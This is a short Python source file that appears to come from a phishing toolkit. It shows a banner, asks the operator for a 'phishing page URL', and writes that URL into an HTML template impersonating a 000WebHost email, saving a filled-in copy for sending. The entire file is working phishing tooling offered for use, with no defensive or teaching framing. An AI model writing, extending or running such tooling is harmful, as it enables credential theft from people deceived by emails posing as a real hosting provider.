from Modules.UI import *

def pageParser():
    clear()
    banner()
    clear()
    banner()
    print(style.YELLOW('--Fill the folowing credentials for 000WebHost phishing email--'))
    print(style.GREEN('\n[+]') + style.RESET("Enter you'r phishing page URL:"))
    pageParser.redirectURL = str(input(style.CYAN(">>> ") + style.RESET('')))


def pageGenerator_WH():
    pageParser()
    fin = open("Templates/000WebHost.html", "rt")
    fout = open("Templates/TempTemplates/000WebHostTemplate.html", "wt")
    for line in fin:
        fout.write(line.replace('#URL', pageParser.redirectURL))
    fin.close()
    fout.close()
